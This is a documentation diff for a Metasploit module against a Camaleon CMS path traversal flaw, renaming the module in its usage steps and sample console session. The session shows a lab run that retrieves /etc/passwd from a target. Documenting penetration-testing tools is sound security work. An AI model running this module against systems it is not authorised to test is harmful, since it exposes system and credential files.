@@ -133,7 +133,7 @@ Then navigate to "Users -> + Add User" and fill out the form.
 
 ## Verification Steps
 
-1. Do: `use auxiliary/gather/camaleon_traversal`
+1. Do: `use auxiliary/gather/camaleon_download_private_file`
 2. Do: `set RHOST [IP]`
 3. Do: `run`
 
@@ -150,14 +150,14 @@ The number of "../" appended to the filename. Default is 13
 ## Scenarios
 
 ```
-msf > use auxiliary/gather/camaleon_traversal 
-msf auxiliary(gather/camaleon_traversal) > set rhost 10.0.0.45
+msf > use auxiliary/gather/camaleon_download_private_file 
+msf auxiliary(gather/camaleon_download_private_file) > set rhost 10.0.0.45
 rhost => 10.0.0.45
-msf auxiliary(gather/camaleon_traversal) > set rport 3000
+msf auxiliary(gather/camaleon_download_private_file) > set rport 3000
 rport => 3000
-msf auxiliary(gather/camaleon_traversal) > set ssl false
+msf auxiliary(gather/camaleon_download_private_file) > set ssl false
 ssl => false
-msf auxiliary(gather/camaleon_traversal) > run
+msf auxiliary(gather/camaleon_download_private_file) > run
 [*] Running module against 10.0.0.45
 [+] /etc/passwd stored as '/home/kali/.msf4/loot/20260411192711_default_10.0.0.45_camaleon.travers_926890.txt'
 
